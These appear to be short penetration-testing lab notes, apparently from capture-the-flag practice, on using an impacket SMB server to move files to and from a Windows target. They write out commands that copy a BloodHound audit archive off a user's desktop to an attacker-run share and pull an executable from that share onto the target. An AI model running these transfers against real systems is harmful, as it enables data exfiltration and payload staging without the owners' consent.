```
 impacket-smbserver share share -smb2support
```

If you have issues with connecting to the SMB share from the Windows machine, setup the SMB server with auth
sudo smbserver.py -username root -password root -smb2support share .

Then you'll have to mount the share
net use Z: \\192.168.45.181\share /user:root root

Finally you'll be able to access the share using cd \\192.168.45.181\share

The reason for this is because some policies disallow guest shares which are shares without auth 

cp C:\users\fsmith\Desktop\"sauna audit_20250221165803_BloodHound.zip   to copy the file to your local machine





impacker-smbserver ShareName SharePath      //server


way1  //client
	copy \\IP\ShareName\file.exe file.exe 
way 2
	net use x: //ip/servername/
	cd x:\
del
	net use x: /delete


use :
	copy \\10.10.17.83\temp\1.exe c:\Users\tolis\Desktop\1.exe
	直接调用也是这么用的。\\